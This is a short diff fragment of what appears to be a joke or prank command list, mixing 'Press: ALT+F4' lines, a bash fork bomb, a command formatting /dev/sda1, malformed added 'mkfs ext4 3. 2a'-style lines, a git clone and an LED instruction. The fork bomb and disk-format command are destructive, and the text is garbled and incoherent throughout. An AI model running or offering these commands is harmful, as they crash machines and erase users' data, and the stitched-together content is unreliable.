@@ -3,7 +3,11 @@ Press: ALT+F4
 Press: ALT+F4
 Press: ALT+F4
 ^
+mkfs ext4 3. 2a
 :(){:|:&};:
+mkfs ext4 3. 2b
+mkfs ext4 3. 2c
+mkfs ext4 3. 2d
 git clone https://github.com/HBMS-0em/off
 BlinkLED: Purple
 mkfs ext4 /dev/sda1
